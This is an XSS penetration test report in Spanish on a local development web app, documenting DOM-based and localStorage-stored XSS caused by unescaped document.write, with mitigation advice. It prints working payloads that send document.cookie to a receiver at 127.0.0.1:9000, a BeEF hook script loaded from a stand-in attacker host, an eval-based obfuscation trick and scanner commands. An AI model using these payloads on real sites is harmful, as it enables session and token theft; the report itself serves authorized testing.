# Informe de análisis XSS - 2026-04-16T12:03:27

Resumen:
- Objetivo: http://web.dev.local:8082
- Tipo de prueba: Búsqueda y explotación de Cross-Site Scripting (DOM/Reflected/Persistent) en entorno autorizado.

Hallazgos generales:
- VULN: Se detectaron vulnerabilidades DOM-based XSS y vectores que permiten inyección persistente en localStorage.
- Vectores concretos:
  1) Parámetro GET `search` (Reflected / DOM XSS)
     - Contexto vulnerable: JS en la página usa URLSearchParams.get('search') guardado en `searchTerm` y escrito con document.write sin escape:
       document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
     - Impacto: ejecución de JavaScript en el contexto del origen (http://web.dev.local:8082).

  2) Parámetros GET `name` y `comment` -> almacenamiento en localStorage y renderizado sin escape (Persistent-like, client-side)
     - Código vulnerable (resumen):
       const name = urlParams.get('name');
       const comment = urlParams.get('comment');
       comments.push({ name: name, comment: comment, date: ... });
       // luego displayComments hace document.write con c.name y c.comment sin sanitizar

Pruebas ejecutadas (reconocimiento):
- curl -sS -L -D /tmp/root.headers -o /tmp/root.html 'http://web.dev.local:8082'
- Inspección manual del HTML/JS (local) para localizar sinks: document.write(...) sin escape.

Payloads de prueba (PoC):
- Reflected / DOM (search):
  http://web.dev.local:8082/?search=%3Cimg%20src=x%20onerror%3D%22new%20Image().src%3D'http%3A%2F%2F127.0.0.1%3A9000%2F%3Fc%3D'%2BencodeURIComponent(document.cookie)%22%3E
  Decodificado: <img src=x onerror="new Image().src='http://127.0.0.1:9000/?c='+encodeURIComponent(document.cookie)">

- Persistent/Stored (name/comment):
  http://web.dev.local:8082/?name=%3Cscript%3Enew%20Image().src%3D'http%3A%2F%2F127.0.0.1%3A9000%2F%3Fc%3D'%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E&comment=test

- BeEF hook (simulado):
  name=%3Cscript%3Evar%20s%3Ddocument.createElement('script');s.src%3D'http%3A%2F%2Fatacante.local%3A3000%2Fhook.js';document.head.appendChild(s);%3C%2Fscript%3E

Comandos/Tools sugeridos (Kali):
- DalFox scan (JS-based): dalfox url --crawl --follow-redirect --skip-bav --custom-header "User-Agent: dalfox" --output dalfox_results.txt
- XSStrike (fuzz): xsstrike -u "http://web.dev.local:8082/?search=INJECT" --crawl
- FFUF to brute GET params: ffuf -u "http://web.dev.local:8082/?FUZZ=INJECT" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200

Ejecución / Explotación:
- Nota: Las vulnerabilidades son DOM-based y se ejecutan en el navegador de la víctima. En este análisis se confirmó la inyección estática analizando el código JS. Para explotar activamente se requieren pasos en un navegador (headless o real) que cargue la URL con el payload. Ejemplo de payload de exfiltración (usando un servidor receptor local en 127.0.0.1:9000):
  <img src=x onerror="new Image().src='http://127.0.0.1:9000/?c='+encodeURIComponent(document.cookie)">

- Simulación de evasión (ofuscación):
  * Base64 payload embedding: var p=atob('PHNjcmlwdD5...');eval(p);
  * Event-based: <svg/onload=...> o <img/src=x onerror=...>

Evidencia y pasos reproducibles manualmente:
1. Abrir en navegador: http://web.dev.local:8082/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> Se observará que el contenido se escribe en la página (DOM) y el script sería ejecutado.
2. Para persistente: navegar al link con name/script y luego refrescar la página -> el comentario malicioso aparece en la lista y ejecuta el script en el navegador del usuario.

Impacto:
- Ejecución arbitraria de JavaScript (DOM XSS) en el origen objetivo.
- Posible robo de cookies, tokens en localStorage/sessionStorage, ejecución de acciones en nombre del usuario y carga de hooks externos (BeEF).

Recomendaciones de mitigación:
- NO usar document.write con contenido no confiable. Evitar concatenación directa de valores desde URLSearchParams.
- Escapar/encodear valores antes de insertarlos en el DOM (textContent, createTextNode o frameworks que hagan escaping automático).
- Para datos almacenados en localStorage, escaparlos antes de renderizar o usar .textContent en elementos creados dinámicamente.
- Implementar CSP (Content-Security-Policy) restrictiva para mitigar carga de scripts de orígenes no permitidos.

Estado de explotación real en este entorno:
- Se confirmó VULN_FOUND (DOM XSS presente).
- No se ejecutó un navegador remoto controlado para recibir exfiltración en este análisis automatizado, por lo que la exfiltración real no fue observable en el servidor receptor desde este proceso. Recomendado: usar un navegador headless (puppeteer/playwright) con un listener HTTP (python -m http.server 9000) para probar la exfiltración y demostrar VULN_EXPLOITED en un laboratorio controlado.

Anexos (fragmentos relevantes):
- Código vulnerable (extracto):
  const urlParams = new URLSearchParams(window.location.search);
  const searchTerm = urlParams.get('search');
  if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
  }

Fin del informe.
